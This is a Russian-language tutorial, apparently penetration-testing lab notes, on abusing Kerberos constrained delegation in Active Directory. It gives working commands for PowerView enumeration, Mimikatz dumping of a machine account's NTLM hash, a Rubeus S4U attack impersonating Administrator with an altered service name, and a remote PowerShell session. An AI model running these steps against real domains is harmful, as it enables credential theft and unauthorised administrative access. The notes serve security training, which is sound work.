На этой схеме видно, что запрос содержит два элемента: аутентификатор и билет TGS.

`Service Ticket` или `TGS ticket` также состоит из двух частей. Часть `unencrypted` содержит `SPN of the requested service`, а часть `encrypted` — информацию о пользователе и ключ сеанса. Злоумышленник может изменить имя сервиса, не нарушив его работу, поскольку имя сервиса не зашифровано.

При ограниченном делегировании делегирование разрешено только для определенного списка имен субъектов-служб. Если злоумышленник взломал служебную учетную запись с ограниченным делегированием, он может перенаправлять полученные попытки аутентификации на одну или неcколько сервисов данной УЗ.


В этой ситуации, если при ограниченном делегировании аутентификация обычно делегируется только для конкретной службы, предоставляемой учетной записью компьютера, например для службы `SQL`, злоумышленник может изменить имя субъекта-службы в своем `AP-REQ` запросе и получить доступ ко всем остальным службам, предлагаемым учетной записью, например к службе `CIFS` . Если делегированный пользователь является локальным администратором целевого компьютера, то злоумышленник может получить доступ к этому компьютеру.

# Атака

## 1) Перечисление с ограниченными правами делегирования

```PowerShell
Import-Module.\PowerView.ps1
Get-DomainComputer -TrustedToAuth
```


Мы можем использовать `Rubeus` для запроса действительного билета TGS у произвольного пользователя, чтобы получить доступ к службе `HTTP` на хосте `WS01` . Чтобы успешно провести эту атаку, нам нужно получить хэш пароля NTLM учетной записи `DMZ01$` компьютера
## 2) Извлекаем NTLM хэш учетки

```PowerShell
.\mimikatz.exe privilege::debug sekurlsa::msv exit
```

##  3) Проводим S4U2Self и S4U2Proxy

```PowerShell
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:www/WS01.inlanefreight.local /altservice:HTTP /user:DMZ01$ /rc4:<NThash> /ptt
```

### Что здесь происходит

Сначала Rubeus запрашивает TGT, чтобы мы могли работать в контексте `DMZ01$`. Затем он отправляет запрос S4U2Self, чтобы получить билет TGS от имени администратора.

```powershell
[*] Got a TGS for 'Administrator@INLANEFREIGHT.LOCAL' to 'DMZ01$@INLANEFREIGHT.LOCAL'
```
Наконец, этот билет TGS используется для выполнения запроса S4U2Proxy, который обновляет SPN в соответствии с нашим запросом на службу `HTTP` .

```powershell
[*] Impersonating user 'Administrator' to target SPN 'www/WS01.inlanefreight.local' [*]   Final ticket will be for the alternate service 'http'`powershell
```

## 4) Используем билет 

```PowerShell
Enter-PSSession ws01.inlanefreight.local
```
